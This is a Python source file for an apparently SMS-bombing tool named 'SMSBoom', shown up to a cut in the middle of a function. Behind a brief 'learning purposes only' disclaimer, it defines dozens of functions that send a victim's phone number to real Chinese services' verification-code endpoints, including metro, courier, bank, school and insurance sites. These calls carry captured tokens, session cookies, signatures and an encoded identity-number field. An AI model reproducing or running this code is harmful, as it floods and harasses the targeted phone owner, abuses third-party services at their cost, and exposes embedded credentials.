import requests
import time
import random
import sys
import os
import json
import datetime
import hashlib
from colorama import init, Fore, Style
import requests
import base64
import json
import time
from urllib.parse import quote, unquote
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# 初始化 colorama
init(autoreset=True)
SMS=print
# 颜色定义
red = "\033[91m"      # 亮红色
green = '\033[92m'    # 亮绿色
yellow = '\033[93m'   # 亮黄色
blue = '\033[94m'     # 亮蓝色
cyan = '\033[96m'     # 亮青色
pink = '\033[95m'     # 亮洋红色
END = "\033[0m"

# 验证服务器配置


def SMS_logo():
    """打印艺术Logo"""
    logo = f"""
{Fore.BLUE}+-----------------------------------+
{Fore.CYAN}              SMSBoom
{Fore.BLUE}+-----------------------------------+{Style.RESET_ALL}
"""
    SMS(logo)

def disclaimer():
    """显示免责声明"""
    text = (
        "免责声明：本工具仅用于学习交流目的，请确保使用符合当地法律法规。任何滥用行为导致的后果由使用者自行承担。\n"
        "项目地址: https://github.com/MallocPointer/SMSBoom-Terminal"
    )
    print(f"\n{Fore.RED}{Style.BRIGHT}{text}{Style.RESET_ALL}\n")


def typewriter(text, color=Fore.WHITE, delay=0.03):
    """打字机效果输出"""
    for char in text:
        sys.stdout.write(f"{color}{char}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(delay)
    SMS()

def clear_screen():
    """清屏函数"""
    os.system('cls' if os.name == 'nt' else 'clear')

# 请求函数定义（返回布尔值表示成功状态）
import requests
import time
import json

# ------------------------- 接口函数定义 -------------------------
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def base64_encode(s):
    return base64.b64encode(s.encode('utf-8')).decode('utf-8')
import requests



# 1. 重庆地铁短信请求
def 短信1(phone):
    url = "https://ycx.cqmetro.cn//bas/mc/v1/send-sms-code"
    headers = {
        "Host": "ycx.cqmetro.cn",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "signature": "Jsz+LXqnwqX2bghxG7QmumvxMMYXtIu1E3/dgYE7qgLDdgggleV711ATvebklUEWzvppqpKTFxvK4v9uAKwaZQj+xNF4e8LCftuAh2iouphUyJqIz39JMRNS7PxvzfntiC9rh8POX84LLwvYjOzISEB2+eE1+N2+DBENnA3Pfys=",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "cityid": "5000",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "nonce": "xHMNQBDpQifWxKMPpPt8NecxpcBipXpM",
        "version": "0200",
        "devicetype": "2",
        "token": "",
        "sequence": "2025091410289883031345",
        "random": "",
        "baseurl": "https://ycx.cqmetro.cn/",
        "appid": "A500120190100001",
        "content-type": "application/json",
        "timestamp": "1757816912899",
        "Referer": "https://servicewechat.com/wxa17aea49c17829df/8/page-frame.html"
    }
    data = f"""{{"mobile_phone":"{phone}","sms_type":"0"}}"""
    requests.post(url, headers=headers, data=data)

# 2. 挂号hao短信请求
def 短信2(phone):
    url = "https://168api-tyxcx.zaiguahao.com/api/common/smsSend"
    headers = {
        "Host": "168api-tyxcx.zaiguahao.com",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "openid": "oV6zA6w65irzV1-yy9fI-q2XoQfs",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "token": "",
        "Referer": "https://servicewechat.com/wxf254782886c95eb0/6/page-frame.html"
    }
    data = f"""{{"applets_id":1352,"phone":"{phone}"}}"""
    requests.post(url, headers=headers, data=data)

# 3. 360jdt短信请求
def 短信3(phone):
    url = f"https://wxmini.360jdt.cn/prod-api/jd-jdt-api/api/mobile/send?appType=1&mobile={phone}&openId=o8J4U7TFmwklhaNtJR-H9Yu-oryo&tenantId=100017"
    headers = {
        "Host": "wxmini.360jdt.cn",
        "Connection": "keep-alive",
        "encData": "a56e8c8506e92d2c56e4512bd86578f3c5b56e443051160ac2eda3b668295d54",
        "sec-ch-ua-platform": "\"Android\"",
        "tenantId": "100017",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
        "tenant": "100017",
        "sec-ch-ua-mobile": "?1",
        "openId": "o8J4U7TFmwklhaNtJR-H9Yu-oryo",
        "appType": "5",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wx86e099ee4d9d98cc Mobile",
        "Accept": "application/json, text/plain, */*",
        "X-Requested-With": "com.tencent.mobileqq",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://wxmini.360jdt.cn/firstCreate?flag=0",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    requests.get(url, headers=headers)

# 4. 快递zs短信请求
def 短信4(phone):
    url = "https://xcx.kuaidizs.cn/xcx/identity/sendCapcha"
    headers = {
        "Host": "xcx.kuaidizs.cn",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "token": "2da74f341fa94690a8e7318ab8682605oV0yQ4o5tAp-Gkp9tMFJH8YWs1oE",
        "Referer": "https://servicewechat.com/wxad29fbce880f2c90/31/page-frame.html"
    }
    data = f"""{{"phone":"{phone}"}}"""
    requests.post(url, headers=headers, data=data)

# 5. 快递100短信请求
def 短信5(phone):
    url = "https://p.kuaidi100.com/xcx/sms/sendcode"
    headers = {
        "Host": "p.kuaidi100.com",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx1dd3d8b53b02d7cf/553/page-frame.html"
    }
    data = f"name={phone}&validcode="
    requests.post(url, headers=headers, data=data)

# 6. iyouya短信请求
def 短信6(phone):
    url = f"https://app-api.iyouya.com/app/memberAccount/captcha?mobile={phone}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip,compress,br,deflate"
    }
    requests.get(url, headers=headers)

import sys
import os


def 短信7(phone):
    url = "https://www.101s.com.cn/prod-api/memorial_hall/user/send"
    headers = {
        "Host": "www.101s.com.cn",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxff5c9882b5e61d35/9/page-frame.html"
    }
    data = f"""{{"phone":"{phone}"}}"""
    requests.post(url, headers=headers, data=data)

# 8. zzsbzswfwzx短信请求
def 短信8(phone):
    url = "https://www.zzsbzswfwzx.cn/zzby/ServerCommand/%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1"
    headers = {
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Android WebView\";v=\"134\"",
        "sec-ch-ua-mobile": "?1",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 miniProgram/wxce26f061db1d4ade Mobile",
        "accept": "*/*",
        "content-type": "application/json",
        "connectionid": "5a73db91-a1e0-45e3-8691-80a40d938a2d",
        "origin": "https://www.zzsbzswfwzx.cn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.zzsbzswfwzx.cn/zzby/denglu?openid=ofqJg5BZKdCHk9nLte3JCXDYGupQ",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "priority": "u=1, i"
    }
    data = f"""{{"Phone":"{phone}"}}"""
    requests.post(url, headers=headers, data=data)

# 9. guaguaiot短信请求
def 短信9(phone):
    url = "https://ggxy.guaguaiot.com/ggxyapp/app/api/v1/auth/sms/code"
    headers = {
        "Host": "ggxy.guaguaiot.com",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "useplatform": "mpWeixin",
        "appversion": "1.0.8",
        "appversioncode": "10009",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx48e0be861389021c/59/page-frame.html"
    }
    data = f"""{{"mobile":"{phone}","smsType":1}}"""
    requests.post(url, headers=headers, data=data)

# 10. xinhualeyu短信请求
def 短信10(phone):
    url = f"https://api.xinhualeyu.com/uums/account/sendSms?loginType=1&mobile={phone}&operaType=1"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip,compress,br,deflate"
    }
    requests.get(url, headers=headers)

# 11. guoli-edu短信请求
def 短信11(phone):
    url = "https://aiop.guoli-edu.com/api-shop/p/user/sms"
    headers = {
        "Host": "aiop.guoli-edu.com",
        "Connection": "keep-alive",
        "authorization": "3Y_B7bbXt6GywpKhb_hxRKa9BZpMqOA1Ir__",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx80116f8937fb0318/14/page-frame.html"
    }
    data = f"""{{"phone":"{phone}"}}"""
    requests.post(url, headers=headers, data=data)

# 12. vmta短信请求
def 短信12(phone):
    url = f"https://jx.vmta.com/forum/user/sendBindCode/{phone}"
    headers = {
        "Host": "jx.vmta.com",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "token": "8e555f29-3bb8-4bde-93bc-6833c4299d91",
        "Referer": "https://servicewechat.com/wxdce2fe3b501ec2d8/74/page-frame.html"
    }
    requests.get(url, headers=headers)

# 13. cmbchina短信请求
def 短信13(phone):
    url = "https://school-gateway.paas.cmbchina.com/common/loginUser/sendWxSmsCode"
    headers = {
        "Host": "school-gateway.paas.cmbchina.com",
        "Connection": "keep-alive",
        "authorization": "",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx61b393284c108b9e/37/page-frame.html"
    }
    data = f"""{{"isLoading":true,"tel":"{phone}","uuid":"","captchaCode":""}}"""
    requests.post(url, headers=headers, data=data)

# 14. school-home短信请求
def 短信14(phone):
    url = "https://api.school-home.cn/api/admin/auth/login/sms-code"
    headers = {
        "Host": "api.school-home.cn",
        "Connection": "keep-alive",
        "charset": "utf-8",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "accept": "application/json",
        "Referer": "https://servicewechat.com/wx9c9848839aeb4fd9/31/page-frame.html"
    }
    data = f"""{{"phone":"{phone}"}}"""
    requests.post(url, headers=headers, data=data)

# 15. jdjy.sh.cn短信请求
def 短信15(phone):
    url = f"https://qsnsthd.jdjy.sh.cn/api-rzzx/renzhengzhongxin/login/sendLoginVerificationCode?sjh={phone}"
    headers = {
        "Host": "qsnsthd.jdjy.sh.cn",
        "Connection": "keep-alive",
        "a": "1",
        "charset": "utf-8",
        "salting": "1184315aad38b49e2651b59dcbd5fd72",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx3fb7a2162cf7de55/23/page-frame.html"
    }
    requests.post(url, headers=headers)

# 16. 717travelQW请求
def 短信16(phone):
    url = f"https://school-api.717travel.com/prod-api/captchaSms?schoolId=1&phonenumber={phone}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2403A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.136 Mobile Safari/537.36 XWEB/1340157 MMWEBSDK/20240404 MMWEBID/9375 MicroMessenger/Lite Luggage/4.2.3 QQ/9.2.10.29070 NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android",
        "Accept-Encoding": "gzip,compress,br,deflate"
    }
    requests.get(url, headers=headers)

# 逐个调用所有短信请求函数


def request_url26(phone):
    url26 = "http://wx2270.cnhis.cc/wx/send/code/login.htm"
    headers26 = {
        "Host": "wx2270.cnhis.cc",
        "Cookie": "SESSION=N2JiMTU3YTMtNWZmYS00OGRjLTgyNDQtM2UwMzkwNTI1YzU4",
        "Accept": "application/json, text/plain, */*",
        "userType": "TX",
        "timeStr": "1716828087532",
        "openId": "",
        "Accept-Language": "zh-cn",
        "token": "",
        "Accept-Encoding": "gzip, deflate",
        "Origin": "http://wx2270.cnhis.cc",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.46(0x18002e16) NetType/WIFI Language/zh_CN",
        "Referer": "http://wx2270.cnhis.cc/wxcommon/web/",
        "Content-Length": "32",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "nonstr": "4rv5a2qk",
        "sign": "eb61d965b36b3074d4c3dc417199fef7"
    }
    data26 = {
        "phone": phone,
        "countryCode": "86"
    }
    try:
        requests.post(url26, headers=headers26, data=data26, timeout=5)
    finally:
        update_progress()
    
def send_qixin18_sms(mobile):
    try:
        encoded_mobile = base64_encode(mobile)
        url = "https://cps.qixin18.com/m/apps/cps/bxn1096837/api/mobile/sendSmsCode?md=0.8036556356856903"
        
        headers = {
            "Host": "cps.qixin18.com",
            "Connection": "keep-alive",
            "Content-Length": "209",
            "traceparent": "00-d5056a43b015f07aded289325bbf2233-cfe0be18fc00d80a-01",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003D57) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://cps.qixin18.com",
            "X-Requested-With": "com.tencent.mm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://cps.qixin18.com/m/apps/cps/bxn1096837/product/insure?encryptInsureNum=cm98HrGWSRoJRojI5Tg6Bg&isFormDetail=1&merak_traceId=0cb083327198781a0a49L9pe4DfciD61",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "nodejs_sid=s%3AJe330pDnPvmMafrtsgLGXZubqQg7Plv7.FB9kbFV89DrYQBJkYRb0UkaPNwzEQm5Trgd0yUlseOk; fed-env=production; _qxc_token_=eb81b40d-43f9-4bcf-8b57-bd165da4fad7; hz_guest_key=3x9a97LHUHZ4y3XPekPH_1754097046804_1_1015544_38625430; _bl_uid=j5mjkd0XtbvkC138scUCkhstU8yy; acw_tc=ac11000117543616244402076e006971cba05a01bd4bb140e4df5a1c961c19; merakApiSessionId=ebb083327198781a0976uqPJu53NwsTZ; beidou_jssdk_session_id=1754361629213-2069604-04d431e52fbfe1-30281942; MERAK_DEVICE_ID=54826bc105b8826c0935c7ef9cb76101; MERAK_RECALL_ID=98b083327198781a0b76EQOm7F0i9Itv; MERAK_SESSIONID_ID=0ab083327198781a0b77ccweQE49Inxl; beidoudata2015jssdkcross=%7B%22distinct_id%22%3A%22%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%7D%2C%22session_id%22%3A%22%22%2C%22%24page_visit_id%22%3A%22%22%2C%22%24device_id%22%3A%22%22%2C"
        }        
        data = {
            "cardNumber": "NDIyNDIzMTk3NTA3MjQ2NjE1",
            "mobile": encoded_mobile,
            "cardTypeId": "1",
            "cname": "op",
            "productId": 105040,
            "merchantId": 1096837,
            "customerId": 37640245,
            "encryptInsureNum": "cm98HrGWSRoJRojI5Tg6Bg"
        }
        response = requests.post(url, headers=headers, json=data, timeout=10)
        return f"qixin18: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"qixin18错误: {str(e)}"
def send_mikecrm_sms(mobile):
    try:
        url = "https://support.mikecrm.com/handler/web/form_runtime/handleGetPhoneVerificationCode.php"
        
        headers = {
            "Host": "support.mikecrm.com",
            "Connection": "keep-alive",
            "Content-Length": "109",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2049A Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.180 Mobile Safari/537.36 XWEB/1380085 MMWEBSDK/20250503 MMWEBID/419 MicroMessenger/8.0.61.2880(0x28003DBE) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://support.mikecrm.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://support.mikecrm.com/j7ctI52?_cpv=%7B%22208395996%22%3A%22http%3A%2F%2Fcn.mikecrm.com%2FozURs1%22%7D",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": "uvi=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz; mk_seed=84; MK_L_UVD=%7B%2223%22%3A%7B%22n%22%3A%22%u6551%u8D4E%22%7D%2C%2224%22%3A%2218070783632%22%2C%2231%22%3A%22%u6551%u8D4E%u7F51%u7EDC%u5B89%u5168%22%2C%2232%22%3A%22%u56FD%u5B89%22%7D; uvis=ERwqUZwjB1eLSXL58Ge9IHiTwzh7omkFegjCa77HG0ErxL9BsVLElvLqYLPmgOoz"
        }
        form_data = {
            "cvs": {
                "t": "j7ctI52",
                "cp": "208396143",
                "mb": mobile
            }
        }
        encoded_data = quote(json.dumps(form_data))
        data = f"d={encoded_data}"        
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return f"mikecrm: {response.status_code} - {response.text[:100]}"        
    except Exception as e:
        return f"mikecrm错误: {str(e)}"
import requests
import threading
from tqdm import tqdm
import json

# 全局变量：已完成数量、总接口数、进度条对象

def request_url1(phone):
    url1 = 'https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code'
    headers1 = {
        'Host': 'mobilev2.atomychina.com.cn',
        'Connection': 'keep-alive',
        'Content-Length': '68',
        'pragma': 'no-cache',
        'design-site-locale': 'zh-CN',
        'Accept-Language': 'zh-CN',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105',
        'X-HTTP-REQUEST-DOMAIN': 'mobilev2.atomychina.com.cn',
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'cache-control': 'no-cache',
        'xweb_xhr': '1',
        'x-requested-with': 'XMLHttpRequest',
        'cookie': 'acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx74d705d9fabf5b77/97/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br'
    }
    data1 = {
        "mobile": phone,
        "captcha": "1111",
        "token": "1111",
        "prefix": 86
    }
    try:
        requests.post(url1, headers=headers1, json=data1, timeout=5)
    finally:
        update_progress()

def request_url2(phone):
    url2 = 'https://apibus.zhihuiyunxing.com/api/v1/common/captcha/send/sms'
    headers2 = {
        'Host': 'apibus.zhihuiyunxing.com',
        'Connection': 'keep-alive',
        'Content-Length': '79',
        'version': 'V2.0.0',
        'xweb_xhr': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'token': '',
        'appKey': 'yuis7s5s4d89g0fj1uy9ssksd0fg0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wx17132144b45008cb/16/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data2 = {
        'phone': phone,
        'random': '31540959202205610',
        'userType': '1',
        'type': 'PASSENGER_LOGIN_CODE'
    }
    try:
        requests.post(url2, headers=headers2, data=data2, timeout=5)
    finally:
        update_progress()

def request_url3(phone):
    url3 = 'https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode'
    headers3 = {
        'Host': 'yczj.api.autohome.com.cn',
        'Connection': 'keep-alive',
        'Content-Length': '353',
        'DP_OPEN_ID': 'o9gLH5SurbWzJacXh2TveA31kUK0',
        'DP_DEVICE_ID': '5db10dd4-e164-4f90-862d-039b22072eef',
        'WzReview': 'app_key=carcomment_android;is_wx=1;userid=0;usertoken=0;dpwxversion=2.2.30;is_rn=1;app_ver=2.7.2;isH5=1;',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090b19)XWEB/11581',
        'Content-Type': 'application/json',
        'REQ_SOURCE': 'wechat_review',
        'Accept': 'application/json',
        'xweb_xhr': '1',
        'Cookie': 'yczj_login_data=',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://servicewechat.com/wxd32646bc23c54d30/72/page-frame.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data3 = {
        "mobile": phone,
        "isDianPing": True,
        "platform": 4,
        "version": "2.2.30",
        "_timestamp": 1736575616,
        "channel": "channel",
        "refPage": "wx_dp",
        "autohomeua": "Windows 10 x64\tcarcomment_windows\t2.7.3\twindows_wx",
        "userid": "",
        "usertoken": "",
        "deviceid": "5db10dd4-e164-4f90-862d-039b22072eef",
        "openid": "o9gLH5SurbWzJacXh2TveA31kUK0",
        "pcpopclub": "",
        "autoUserId": ""
    }
    try:
        requests.post(url3, headers=headers3, json=data3, timeout=5)
    finally:
        update_progress()

def request_url4(phone):
    url4 = 'https://gateway-front-external.nio.com/onvo/moat/1100023/n/a/user/access/verification_code?hash_type=sha256'
    headers4 = {
        'Host': 'gateway-front-external.nio.com',
